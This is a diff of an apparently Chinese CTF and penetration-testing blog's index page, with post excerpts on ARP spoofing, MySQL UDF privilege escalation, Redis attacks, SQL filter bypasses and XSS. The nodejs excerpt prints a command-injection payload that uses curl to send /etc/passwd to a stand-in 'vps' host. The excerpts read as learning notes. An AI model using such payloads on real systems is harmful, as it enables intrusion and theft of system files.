@@ -368,6 +368,263 @@ height:50vh;
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/2021/06/18/arp%E6%AC%BA%E9%AA%97%E4%B8%8E%E6%94%BB%E5%87%BB/" >
+            
+                <span>arp欺骗与攻击</span>
+        </a>
+        <div class="abstract-content">
+            arp欺骗原理每个主机都有IP和MAC地址对应的关系的缓存表，由于在局域网内主机的数据传输依靠的是MAC地址进行数据传输，并且不会验证是否向对方发送过ARP请求包，因此可以通过替换目标主机的缓存表来达到arp欺骗的目的
+实现arp欺骗
+使用工具:arpspoof(包含在dsniff工具中)
+平台:kali
+
+步骤查看自己ip1ifconfig -a
+
+查看局域网内ip此处有多个命令，推荐三个常用的
+123arp-scan -lfping -g C段(扫描存活主机，但是没有mac地址)netdiscover -r 网段/24
+这是fping -g的截图
+ARP欺骗
+开启IP转发1echo ...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/06/18</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2021/06/18/udf%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/" >
+            
+                <span>udf提权学习</span>
+        </a>
+        <div class="abstract-content">
+            UDF定义UDF (user defined function)**，即用户自定义函数。是通过添加新函数，对MySQL的功能进行扩充，可以通过导入dll文件增加新的函数**,执行系统命令
+UDF提权步骤查看secure_file_priv的值1234show global variables like &#x27;secure%&#x27;;     当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权     当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/06/18</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "渗透测试">渗透测试</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "提权">提权</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2021/05/16/2021CISCNweb%E6%80%BB%E7%BB%93/" >
+            
+                <span>2021CISCNweb总结</span>
+        </a>
+        <div class="abstract-content">
+            前言单纯记录下考点
+WEBupload考点
+文件上传绕过
+unicode欺骗
+
+
+做题同目录两个源码,index.php,example.php(须扫目录)
+12345678910111213141516171819202122232425262728293031&lt;?phpif (!isset($_GET[&quot;ctf&quot;])) &#123;    highlight_file(__FILE__);    die();&#125;if(isset($_GET[&quot;ctf&quot;]))    $ctf = $_GET[&quot;ctf&quot;];if(...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/05/16</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "2021CISCN">2021CISCN</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "文件上传">文件上传</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "uncide欺骗">uncide欺骗</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "无列名注入">无列名注入</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "php反射类利用">php反射类利用</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2021/04/24/%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E5%B0%8F%E7%AC%94%E8%AE%B0/" >
+            
+                <span>弱类型比较小笔记</span>
+        </a>
+        <div class="abstract-content">
+            松散比较当比较类型不同时自动转换类型
+1234&lt;?phpvar_dump(null ==false); //bool(true)var_dump(&#x27;aa&#x27;==0); //bool(true)?&gt;
+
+Hash函数绕过https://hackerqwq.github.io/2020/06/10/MD5-collision/
+弱类型函数is_numeric()is_numeric() 检测变量是否为数字或数字字符串。如果 是数字和数字字符串则返回 TRUE，否则返回 FALSE。
+它的弱类型问题是他支持十六进制0x格式，攻击者把payload改成十六进制0x，i...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/04/24</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "弱类型比较">弱类型比较</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2021/04/23/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%80%BB%E7%BB%93/" >
+            
+                <span>代码执行小总结</span>
+        </a>
+        <div class="abstract-content">
+            代码执行漏洞形成原因：客户端提交的参数，未经任何过滤，传入可以执行代码的函数，造成代码执行漏洞。常见代码注射函数：如：eval、preg_replace+/e、assert、call_user_func、call_user_func_array、create_function等函数漏洞危害：执行代码，写入webshell、控制服务器
+示例代码：
+12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: 羽# @Date:   2020-09-05 20:31:22# @Last Modif...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/04/23</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "代码执行">代码执行</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2021/04/20/nodejs%E5%88%A9%E7%94%A8%E5%B0%8F%E6%80%BB%E7%BB%93/" >
+            
+                <span>nodejs利用小总结</span>
+        </a>
+        <div class="abstract-content">
+            参考链接：Node.js 常见漏洞学习与总结
+eval导致的命令执行常见payload弹计算器(windows)：
+1/eval?q=require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);
+读取文件(linux)：
+12/eval?q=require(&#x27;child_process&#x27;).exec(&#x27;curl -F &quot;x=`cat /etc/passwd`&quot; http://vps&#x27;);;curl -F参数用于传输二进制文件
+反弹shell(linux)：
+12345/ev...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/04/20</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "nodejs">nodejs</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2021/04/19/redis%E6%94%BB%E9%98%B2%E5%88%A9%E7%94%A8%E9%9D%A2%E6%80%BB%E7%BB%93/" >
+            
+                <span>redis攻防利用面总结</span>
+        </a>
+        <div class="abstract-content">
+            本文原链接：浅析Linux下Redis的攻击面,本文只做攻击面记录，搭建请看菜鸟教程或者上述文章
+redis3.2.0前无密码登录且暴露6379redis为了方便，在3.2.0版本前无密码登录且对外暴露6379
+12341.docker run --name redis -p6379:6379 -d redis:3.0 2.redis-cli x.x.x.123 3.config get requirepass# docker部署默认都是以redis权限执行的。
+
+Tips：3.2.0之后虽然增加了保护模式只允许本地访问，但是还是默认无密码
+
+redis信息泄露info命令泄露服务器信息...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/04/19</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "渗透测试">渗透测试</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "redis攻防">redis攻防</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/2021/04/17/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81%E8%AF%BB%E5%8F%96%E8%B7%AF%E5%BE%84-NU1L%E7%9A%84%E4%B9%A6/" >
             
                 <span>文件读取漏洞常见读取路径(NU1L的书)</span>
@@ -477,288 +734,6 @@ create_function注入源码12345678910111213141516171819202122232425262728293031
         <a class="post-tag" href="javascript:void(0);" data-tags = "PHP伪协议">PHP伪协议</a>
     
         <a class="post-tag" href="javascript:void(0);" data-tags = "create_function注入">create_function注入</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2021/04/08/sql%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E9%80%9F%E6%9F%A5/" >
-            
-                <span>sql绕过过滤速查</span>
-        </a>
-        <div class="abstract-content">
-            空格过滤注释符12/**//!**/
-双空格%20%20
-回车绕过ascii码为chr(13)&amp;chr(10)，url编码为%0d%0a
-括号绕过1select(user())from dual where(1=1)and(2=2)
-
-另类空格%0a、%0b、%0c、%0d、%09、%a0等
-引号过滤使用十六进制1select column_name  from information_schema.tables where table_name=0x7573657273
-使用反斜杠\1SELECT * FROM wp_news WHERE id = &#x27;a\&#x27;...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/04/08</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "sql">sql</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2021/04/07/2021%E7%BA%A2%E6%98%8E%E8%B0%B7misc%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" >
-            
-                <span>2021红明谷misc部分复现</span>
-        </a>
-        <div class="abstract-content">
-            红明谷misc部分复现InputMonitor考点
-输入法取证
-pdf隐写解法了解输入法取证https://mp.weixin.qq.com/s/0p3vbLub5vPKO5Pik9zmUQ
-
-这里用深蓝词库转换工具
-发现存在6位密码，但是另一个词库文件打不开，因此直接看，这里我没有找到，因此直接用网上的
-转换为word，就隐藏在图片下面
-我的心是冰冰的考点
-盲水印解密
-流量分析键盘数据解题文件夹下存在bingbing.png和bingbing.zip两个文件，思路应该是解出bingbing.jpg的密码，然后得到zip的文件
-
-bingbing.jpg拿去盲水印解密，得到密码：bing...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/04/07</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "2021红明谷">2021红明谷</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "输入法取证">输入法取证</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "盲水印隐写">盲水印隐写</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "哈夫曼编码">哈夫曼编码</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "流量分析">流量分析</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2021/04/04/proc%E7%9B%AE%E5%BD%95%E5%9C%A8ctf%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" >
-            
-                <span>proc目录在ctf中的应用</span>
-        </a>
-        <div class="abstract-content">
-            /proc目录Linux系统上的/proc目录是一种文件系统，即proc文件系统。与其它常见的文件系统不同的是，/proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。
-简单来讲，/proc 目录即保存在系统内存中的信息，大多数虚拟文件可以使用文件查看命令如cat、more或者less进行查看，有些文件信息表述的内容可以一目了然，但也有文件的信息却不怎么具有可读性。
-/proc 目录中包含许多以数字命名的子目录，这些数字表示系统当前正在运行进...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/04/04</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2021/04/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/" >
-            
-                <span>内网渗透-信息收集篇</span>
-        </a>
-        <div class="abstract-content">
-            介绍当我们通过渗透进入内网环境后，面对的是一片未知区域。需要对当前机器角色判断，对机器所处区域分析。
-判断当前机器区域判断机器所处于网络拓扑哪个区域，是在DMZ区、办公区、核心区。区域界限是相对的
-机器角色判断
-文件服务器：配合社工，生成payload捆绑到文件服务器公用文件上，可批量上线主机
-
-DNS服务器：端口53，可通过DNS服务器获取内网web系统信息，或者探测域信息
-
-DHCP服务器：查看内网多组网段信息，更多的获取拓补信息
-
-开发测试服务器：获取源码，新的信息资产，多存在弱口令
-
-代理服务器：获取服务器账号，拿到各种密码
-
-web服务器：可能需要提权(一般接触到的环境)
-
-个...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/04/01</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "内网渗透">内网渗透</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "信息收集">信息收集</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "渗透">渗透</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2021/03/26/Nep2021%E4%B8%AA%E4%BA%BA%E8%B5%9B%E6%80%BB%E7%BB%93-wp-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" >
-            
-                <span>Nep2021个人赛总结&amp;wp(学习笔记)</span>
-        </a>
-        <div class="abstract-content">
-            weblittletrick考点
-命令执行绕过代码1234567891011&lt;?php    error_reporting(0);    highlight_file(__FILE__);    $nep = $_GET[&#x27;nep&#x27;];    $len = $_GET[&#x27;len&#x27;];    if(intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13)&#123;        eval(substr($nep,0,$len));    &#125;else&#123;        die(&#x2...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/03/26</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "2021Nep">2021Nep</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "命令执行">命令执行</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "PHP原生类">PHP原生类</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "云函数">云函数</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "JAVA_WEB">JAVA_WEB</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ThinkPHP">ThinkPHP</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "原型链污染">原型链污染</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "nodejs">nodejs</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2021/02/28/sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E7%AC%94%E8%AE%B0/" >
-            
-                <span>sql注入速查笔记</span>
-        </a>
-        <div class="abstract-content">
-            sql注入分类方式：
-1234提交方式：GET POST COOKIE参数注入：数字型 字符型 搜索型数据库类型：ACCESS&#x2F;Mysql&#x2F;MSSQL&#x2F;ORacle&#x2F;SqlServer手工注入方法：联合查询、报错注入、盲注(基于布尔型、基于时间延迟)
-
-存在sql注入的代码
-1234567891011121314151617181920212223242526272829&lt;?php$db = new mysqli(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;sql...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/02/28</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "sql">sql</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2021/02/27/XSS%E7%9A%84payload%E5%92%8C%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" >
-            
-                <span>XSS的payload和绕过总结</span>
-        </a>
-        <div class="abstract-content">
-            XSS 简介
-XSS（Cross Site Scripting，跨站脚本攻击）是一类特殊的 Web 客户端脚本注入攻击手段，通 常指攻击者通过“HTML 注入”篡改了网页，插入恶意的脚本，从而在用户浏览网页时控制 浏览器的一种攻击。当应用程序发送给浏览器的页面中包含用户提供的数据，而这些数据没有经过适当的转义， 或者在这些内容被显示在页面之前没有验证它们都是安全的，使得输入被视为浏览器中的动 态内容，就会导致存在跨站脚本漏洞。按照“数据是否保存在服务器”，XSS 被分为：反射型  XSS 和存储型 XSS。
-
-XSS fuzz1234567891011121314151617181920...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/02/27</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "XSS">XSS</a>
     
 </div>
             
@@ -3159,9 +3134,142 @@ XSS fuzz1234567891011121314151617181920...
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 132
+        Total : 139
         </div>
         <!-- search  -->
         
@@ -3178,6 +3286,46 @@ XSS fuzz1234567891011121314151617181920...
     
     <div class="archive-year"> 2021 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/13</span><a class="archive-post-title" href= "/2021/12/13/javaweb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" >javaweb代码审计(反序列化漏洞)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/12</span><a class="archive-post-title" href= "/2021/12/12/javaweb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-SpEL%E6%BC%8F%E6%B4%9E/" >javaweb代码审计学习(SpEL漏洞)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span><a class="archive-post-title" href= "/2021/12/11/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" >log4j远程代码执行漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href= "/2021/12/05/javaweb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-XXE%E6%BC%8F%E6%B4%9E/" >javaweb代码审计(XXE漏洞)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href= "/2021/12/05/javaweb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" >javaweb代码审计学习(命令执行)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/30</span><a class="archive-post-title" href= "/2021/11/30/javaweb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-URL%E8%B7%B3%E8%BD%AC/" >javaweb代码审计学习(目录穿越&URL跳转)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/29</span><a class="archive-post-title" href= "/2021/11/29/javaweb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" >javaweb代码审计学习(文件上传漏洞)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/17</span><a class="archive-post-title" href= "/2021/11/17/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%85%A5%E9%97%A8-1-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%92%8C%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%80%E4%BB%8B/" >神经网络入门(1):神经网络和机器学习简介</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -3317,11 +3465,6 @@ XSS fuzz1234567891011121314151617181920...
     
         <li class="archive-post-item">
             <span class="archive-post-date">08/03</span><a class="archive-post-title" href= "/2021/08/03/pickle%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" >pickle序列化与反序列化</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/28</span><a class="archive-post-title" href= "/2021/07/28/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E4%B8%80/" >Java序列化与反序列化学习(一)</a>
         </li>
     
     
@@ -3857,9 +4000,21 @@ XSS fuzz1234567891011121314151617181920...
     
         <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
     
+        <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
+    
         <span class="sidebar-tag-name" data-tags="PHP反序列化"><span class="iconfont-archer">&#xe606;</span>PHP反序列化</span>
     
-        <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
+        <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
+    
+        <span class="sidebar-tag-name" data-tags="2021红明谷"><span class="iconfont-archer">&#xe606;</span>2021红明谷</span>
+    
+        <span class="sidebar-tag-name" data-tags="输入法取证"><span class="iconfont-archer">&#xe606;</span>输入法取证</span>
+    
+        <span class="sidebar-tag-name" data-tags="盲水印隐写"><span class="iconfont-archer">&#xe606;</span>盲水印隐写</span>
+    
+        <span class="sidebar-tag-name" data-tags="哈夫曼编码"><span class="iconfont-archer">&#xe606;</span>哈夫曼编码</span>
+    
+        <span class="sidebar-tag-name" data-tags="流量分析"><span class="iconfont-archer">&#xe606;</span>流量分析</span>
     
         <span class="sidebar-tag-name" data-tags="2021CISCN"><span class="iconfont-archer">&#xe606;</span>2021CISCN</span>
     
@@ -3873,33 +4028,21 @@ XSS fuzz1234567891011121314151617181920...
     
         <span class="sidebar-tag-name" data-tags="Android"><span class="iconfont-archer">&#xe606;</span>Android</span>
     
-        <span class="sidebar-tag-name" data-tags="2021红明谷"><span class="iconfont-archer">&#xe606;</span>2021红明谷</span>
-    
-        <span class="sidebar-tag-name" data-tags="输入法取证"><span class="iconfont-archer">&#xe606;</span>输入法取证</span>
-    
-        <span class="sidebar-tag-name" data-tags="盲水印隐写"><span class="iconfont-archer">&#xe606;</span>盲水印隐写</span>
-    
-        <span class="sidebar-tag-name" data-tags="哈夫曼编码"><span class="iconfont-archer">&#xe606;</span>哈夫曼编码</span>
-    
-        <span class="sidebar-tag-name" data-tags="流量分析"><span class="iconfont-archer">&#xe606;</span>流量分析</span>
-    
         <span class="sidebar-tag-name" data-tags="md5"><span class="iconfont-archer">&#xe606;</span>md5</span>
     
         <span class="sidebar-tag-name" data-tags="shtml"><span class="iconfont-archer">&#xe606;</span>shtml</span>
     
-        <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
-    
-        <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
+        <span class="sidebar-tag-name" data-tags="png结构"><span class="iconfont-archer">&#xe606;</span>png结构</span>
     
         <span class="sidebar-tag-name" data-tags="CRC32"><span class="iconfont-archer">&#xe606;</span>CRC32</span>
     
+        <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
+    
         <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
     
-        <span class="sidebar-tag-name" data-tags="png结构"><span class="iconfont-archer">&#xe606;</span>png结构</span>
+        <span class="sidebar-tag-name" data-tags="CVE"><span class="iconfont-archer">&#xe606;</span>CVE</span>
     
         <span class="sidebar-tag-name" data-tags="Hash"><span class="iconfont-archer">&#xe606;</span>Hash</span>
-    
-        <span class="sidebar-tag-name" data-tags="CVE"><span class="iconfont-archer">&#xe606;</span>CVE</span>
     
         <span class="sidebar-tag-name" data-tags="php_upload_progress_session"><span class="iconfont-archer">&#xe606;</span>php_upload_progress_session</span>
     
@@ -3929,9 +4072,9 @@ XSS fuzz1234567891011121314151617181920...
     
         <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
     
-        <span class="sidebar-tag-name" data-tags="SSTI"><span class="iconfont-archer">&#xe606;</span>SSTI</span>
-    
         <span class="sidebar-tag-name" data-tags="源码泄露"><span class="iconfont-archer">&#xe606;</span>源码泄露</span>
+    
+        <span class="sidebar-tag-name" data-tags="SSTI"><span class="iconfont-archer">&#xe606;</span>SSTI</span>
     
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
@@ -3967,9 +4110,9 @@ XSS fuzz1234567891011121314151617181920...
     
         <span class="sidebar-tag-name" data-tags="信息收集"><span class="iconfont-archer">&#xe606;</span>信息收集</span>
     
-        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
-    
         <span class="sidebar-tag-name" data-tags="PHP伪协议"><span class="iconfont-archer">&#xe606;</span>PHP伪协议</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
         <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
     
@@ -4015,13 +4158,15 @@ XSS fuzz1234567891011121314151617181920...
     
         <span class="sidebar-tag-name" data-tags="文件包含"><span class="iconfont-archer">&#xe606;</span>文件包含</span>
     
-        <span class="sidebar-tag-name" data-tags="文件读取漏洞"><span class="iconfont-archer">&#xe606;</span>文件读取漏洞</span>
-    
